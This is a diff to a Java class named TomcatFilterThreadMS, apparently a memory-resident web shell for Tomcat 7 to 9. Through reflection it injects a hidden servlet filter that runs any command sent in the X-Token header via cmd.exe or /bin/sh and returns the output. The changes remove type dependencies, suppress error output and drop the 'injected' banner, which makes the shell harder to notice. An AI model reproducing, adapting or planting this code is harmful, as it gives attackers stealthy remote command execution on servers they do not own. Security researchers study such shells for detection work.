@@ -1,8 +1,5 @@
 package com.demo.memshell;
 
-import org.apache.catalina.core.ApplicationContext;
-import org.apache.catalina.core.StandardContext;
-
 import javax.servlet.*;
 import javax.servlet.http.HttpServletRequest;
 import javax.servlet.http.HttpServletResponse;
@@ -16,11 +13,12 @@ import java.lang.reflect.Field;
  * Tomcat 7 8 9
  */
 public class TomcatFilterThreadMS implements Filter {
-
-    final private static String NAME = "Whoopsunix";
-    final private static String pattern = "/WhoopsunixShell";
+    private static String NAME = "Whoopsunix";
+    private static String pattern = "/WhoopsunixShell";
+    private static String header = "X-Token";
     private static HttpServletRequest request;
     private static HttpServletResponse response;
+
     public TomcatFilterThreadMS() {
 
     }
@@ -64,24 +62,24 @@ public class TomcatFilterThreadMS implements Filter {
             /**
              * 注入 Filter
              */
-            StandardContext standardContext;
+            Object standardContext;
             try {
                 ServletContext servletContext = (ServletContext) request.getClass().getDeclaredMethod("getServletContext").invoke(request);
-                ApplicationContext applicationContext = (ApplicationContext) getFieldValue(servletContext, "context");
-                standardContext = (StandardContext) getFieldValue(applicationContext, "context");
+                Object applicationContext = getFieldValue(servletContext, "context");
+                standardContext = getFieldValue(applicationContext, "context");
             } catch (NoSuchMethodException e) {
-                standardContext = (StandardContext) getFieldValue(request, "context");
+                standardContext = getFieldValue(request, "context");
             }
 
             addFilter(standardContext);
 
         } catch (Exception e) {
-            e.printStackTrace();
         }
     }
 
-    public static void addFilter(StandardContext standardContext){
+    public static void addFilter(Object standardContext) {
         try {
+
             Object filterDef = standardContext.getClass().getDeclaredMethod("findFilterDef", String.class).invoke(standardContext, NAME);
 
             if (filterDef != null) {
@@ -135,7 +133,7 @@ public class TomcatFilterThreadMS implements Filter {
                 org.apache.catalina.core.ApplicationFilterConfig filterConfig = (org.apache.catalina.core.ApplicationFilterConfig) constructor.newInstance(standardContext, filterDef);
                 filterConfigs.put(NAME, filterConfig);
             }
-        }catch (Exception e){
+        } catch (Exception e) {
 
         }
     }
@@ -149,13 +147,12 @@ public class TomcatFilterThreadMS implements Filter {
     public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) {
         try {
             HttpServletRequest httpServletRequest = (HttpServletRequest) servletRequest;
-            String header = httpServletRequest.getHeader("X-Token");
-            if (header == null) {
+            String cmd = httpServletRequest.getHeader(header);
+            if (cmd == null) {
                 return;
             }
-            String result = exec(header);
+            String result = exec(cmd);
             PrintWriter printWriter = servletResponse.getWriter();
-            printWriter.println("TomcatFilterThreadMS injected");
             printWriter.println(result);
         } catch (Exception e) {
 
@@ -171,7 +168,7 @@ public class TomcatFilterThreadMS implements Filter {
     public static String exec(String str) {
         try {
             String[] cmd = null;
-            if (System.getProperty("os.name").toLowerCase().contains("windows")) {
+            if (System.getProperty("os.name").toLowerCase().contains("win")) {
                 cmd = new String[]{"cmd.exe", "/c", str};
             } else {
                 cmd = new String[]{"/bin/sh", "-c", str};
